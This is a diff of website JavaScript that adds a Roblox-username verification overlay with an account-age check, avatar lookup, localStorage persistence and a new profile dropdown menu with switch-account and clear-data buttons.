+      '#rc-profile-dropdown .rc-dd-title{font-size:0.75rem;color:rgba(165,125,125,0.7);text-transform:uppercase;letter-spacing:0.05em;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid rgba(239,68,68,0.1)}',
+      '#rc-profile-dropdown .rc-dd-row{display:flex;align-items:center;gap:8px;margin-bottom:6px}',
+      '#rc-profile-dropdown .rc-dd-row img{width:28px;height:28px;border-radius:6px;object-fit:cover;border:1px solid rgba(239,68,68,0.2)}',
+      '#rc-profile-dropdown .rc-dd-row span{font-size:0.85rem;color:#fff;font-weight:500}',
+      '#rc-profile-dropdown .rc-dd-btn{width:100%;padding:10px 12px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.15);border-radius:0.7rem;color:#fca5a5;font-size:0.85rem;font-weight:600;cursor:pointer;text-align:left;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease;margin-top:4px}',
+      '#rc-profile-dropdown .rc-dd-btn:hover{background:rgba(239,68,68,0.15);border-color:rgba(239,68,68,0.3);color:#fff}',
+      '#rc-profile-dropdown .rc-dd-btn.danger{border-color:rgba(239,68,68,0.3);color:#ef4444}',
+      '#rc-profile-dropdown .rc-dd-btn.danger:hover{background:rgba(239,68,68,0.2);border-color:rgba(239,68,68,0.5);color:#fca5a5}'
     ].join('\n');
     overlay.appendChild(style);
 
@@ -854,41 +608,30 @@
 
     if (!username) { error.style.display = 'block'; error.textContent = 'Please enter a Roblox username.'; return; }
 
-    btn.disabled = true;
-    btn.textContent = 'Verifying...';
-    error.style.display = 'none';
-    loader.style.display = 'block';
+    btn.disabled = true; btn.textContent = 'Verifying...'; error.style.display = 'none'; loader.style.display = 'block';
 
     doVerification(username)
       .then(function (data) {
-        loader.style.display = 'none';
-        btn.disabled = false;
-        btn.textContent = 'Verify Profile';
-
+        loader.style.display = 'none'; btn.disabled = false; btn.textContent = 'Verify Profile';
         var daysEl = document.getElementById('rc-days-old');
         daysEl.textContent = data.daysOld;
         daysEl.className = 'rc-stat-value ' + (data.accountAgeOk ? 'rc-profile-age-ok' : 'rc-profile-age-bad');
-
         document.getElementById('rc-verify-form').style.display = 'none';
         document.getElementById('rc-profile-display').style.display = 'block';
-
         document.getElementById('rc-display-name').textContent = data.name;
         document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
         document.getElementById('rc-created').textContent = data.createdFormatted;
 
-        /* Get avatar (non-blocking) */
         var avatarUrl = data.imageUrl || null;
         if (avatarUrl) {
           document.getElementById('rc-avatar').src = avatarUrl;
         } else {
-          getAvatarServerless(data.id)
-            .then(function (url) {
-              if (url) { document.getElementById('rc-avatar').src = url; return; }
-              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
-            })
-            .catch(function () {
-              roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
-            });
+          getAvatarServerless(data.id).then(function (url) {
+            if (url) { document.getElementById('rc-avatar').src = url; return; }
+            roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
+          }).catch(function () {
+            roproxyAvatar(data.id).then(function (u) { if (u) document.getElementById('rc-avatar').src = u; }).catch(function () {});
+          });
         }
 
         var actions = document.getElementById('rc-actions');
@@ -898,23 +641,21 @@
           blocked.style.display = 'none';
           actions.style.display = 'flex';
           actions.innerHTML = '<button class="rc-btn-primary" onclick="__rcEnterSite()">Enter Site</button>';
+          /* Save username and avatar permanently */
+          localStorage.setItem(USERNAME_KEY, username);
+          localStorage.setItem(FIRST_ACCESS_KEY, 'done');
         } else {
           actions.style.display = 'flex';
           blocked.style.display = 'block';
           actions.innerHTML = '<button class="rc-btn-secondary" onclick="__rcRetryProfile()">Try Another Account</button>';
+          localStorage.setItem(USERNAME_KEY, username);
+          localStorage.setItem(FIRST_ACCESS_KEY, 'done');
         }
       })
       .catch(function (err) {
-        loader.style.display = 'none';
-        btn.disabled = false;
-        btn.textContent = 'Verify Profile';
-        error.style.display = 'block';
-
-        if (err.message === '429') {
-          error.textContent = 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.';
-        } else {
-          error.textContent = err.message || 'Failed to verify profile. Please try again.';
-        }
+        loader.style.display = 'none'; btn.disabled = false; btn.textContent = 'Verify Profile'; error.style.display = 'block';
+        if (err.message === '429') { error.textContent = 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.'; }
+        else { error.textContent = err.message || 'Failed to verify profile. Please try again.'; }
       });
   };
 
@@ -925,8 +666,9 @@
       overlay.style.animation = 'rc-fadeout .3s ease forwards';
       setTimeout(function () {
         overlay.remove();
-        /* Inject promo video after verification overlay is closed */
         injectPromoVideo();
+        /* Create profile menu */
+        createProfileMenu();
       }, 310);
     }
     sessionStorage.setItem(PROFILE_KEY, 'verified');
@@ -938,22 +680,125 @@
     var form = document.getElementById('rc-verify-form');
     var input = document.getElementById('rc-username-input');
     var error = document.getElementById('rc-verify-error');
-    display.style.display = 'none';
-    form.style.display = 'block';
-    input.value = '';
-    input.focus();
-    error.style.display = 'none';
+    display.style.display = 'none'; form.style.display = 'block'; input.value = ''; input.focus(); error.style.display = 'none';
   };
 
-  /* ── Check if verified ─────────────────────────────────── */
-  function isVerified() { return sessionStorage.getItem(PROFILE_KEY) === 'verified'; }
+  /* ══════════════════════════════════════════════════════════
+     PROFILE MENU — top-right corner
+     ══════════════════════════════════════════════════════════ */
 
-  /* ── Show verification on load ─────────────────────────── */
+  function createProfileMenu() {
+    if (document.getElementById('rc-profile-menu')) return;
+
+    var menu = document.createElement('div');
+    menu.id = 'rc-profile-menu';
+    menu.innerHTML =
+      '<img id="rc-menu-avatar" src="" alt="Avatar">' +
+      '<span id="rc-menu-name">Profile</span>' +
+      '<span class="rc-menu-arrow">\u25BC</span>';
+
+    var dropdown = document.createElement('div');
+    dropdown.id = 'rc-profile-dropdown';
+    dropdown.innerHTML =
+      '<div class="rc-dd-title">Profile</div>' +
+      '<div class="rc-dd-row"><img id="rc-dd-avatar" src="" alt="Avatar"><span id="rc-dd-name">Username</span></div>' +
+      '<button class="rc-dd-btn" id="rc-btn-swap">Switch Account</button>' +
+      '<button class="rc-dd-btn danger" id="rc-btn-clear">Clear All Data</button>';
+
+    document.body.appendChild(menu);
+    document.body.appendChild(dropdown);
+
+    /* Load saved profile */
+    var savedUsername = localStorage.getItem(USERNAME_KEY) || '';
+    var savedAvatar = localStorage.getItem(AVATAR_KEY) || '';
+    if (savedUsername) {
+      document.getElementById('rc-menu-name').textContent = savedUsername;
+      document.getElementById('rc-dd-name').textContent = savedUsername;
+    }
+    if (savedAvatar) {
+      document.getElementById('rc-menu-avatar').src = savedAvatar;
+      document.getElementById('rc-dd-avatar').src = savedAvatar;
+    } else {
+      /* Try to get avatar from cache or fetch */
+      getAvatarServerless(savedUsername).then(function (url) {
+        if (url) {
+          document.getElementById('rc-menu-avatar').src = url;
+          document.getElementById('rc-dd-avatar').src = url;
+          localStorage.setItem(AVATAR_KEY, url);
+        }
+      }).catch(function () {});
+    }
+
+    /* Toggle dropdown */
+    menu.addEventListener('click', function (e) {
+      e.stopPropagation();
+      dropdown.classList.toggle('show');
+    });
+
+    /* Close on outside click */
+    document.addEventListener('click', function (e) {
+      if (!menu.contains(e.target) && !dropdown.contains(e.target)) {
+        dropdown.classList.remove('show');
+      }
+    });
+
+    /* Switch account */
+    document.getElementById('rc-btn-swap').addEventListener('click', function () {
+      dropdown.classList.remove('show');
+      showProfileVerification();
+      /* Pre-fill with saved username if exists */
+      if (savedUsername) {
+        setTimeout(function () {
+          var input = document.getElementById('rc-username-input');
+          if (input) input.value = savedUsername;
+        }, 100);
+      }
+    });
+
+    /* Clear all data */
+    document.getElementById('rc-btn-clear').addEventListener('click', function () {
+      dropdown.classList.remove('show');
+      localStorage.removeItem(USERNAME_KEY);
+      localStorage.removeItem(AVATAR_KEY);
+      localStorage.removeItem(PROFILE_KEY);
+      localStorage.removeItem('rc_tokens');
+      localStorage.removeItem(FIRST_ACCESS_KEY);
+      /* Remove all rc_ cache keys */
+      for (var i = localStorage.length - 1; i >= 0; i--) {
+        var key = localStorage.key(i);
+        if (key && key.indexOf('rc_') === 0) localStorage.removeItem(key);
+      }
+      /* Reload to show verification overlay */
+      window.location.reload();
+    });
+  }
+
+  /* ── Inject profile menu into the React header ─────────── */
+  function injectProfileMenu() {
+    /* Wait for header to be rendered by React */
+    var checkInterval = setInterval(function () {
+      var header = document.querySelector('header');
+      if (header) {
+        clearInterval(checkInterval);
+        createProfileMenu();
+      }
+    }, 200);
+    /* Stop checking after 10 seconds */
+    setTimeout(function () { clearInterval(checkInterval); }, 10000);
+  }
+
+  /* ── Show verification or proceed ──────────────────────── */
   if (!isVerified()) {
     showProfileVerification();
+    /* Also check if first access */
+    if (!localStorage.getItem(FIRST_ACCESS_KEY)) {
+      /* This is the first time — mark it so next time we know they visited */
+      localStorage.setItem(FIRST_ACCESS_KEY, 'pending');
+    }
   } else {
-    /* Already verified (from a previous session) — inject promo video */
+    /* Already verified — inject promo video and profile menu */
     injectPromoVideo();
+    injectProfileMenu();
   }
 
   /* ── MutationObserver ──────────────────────────────────── */
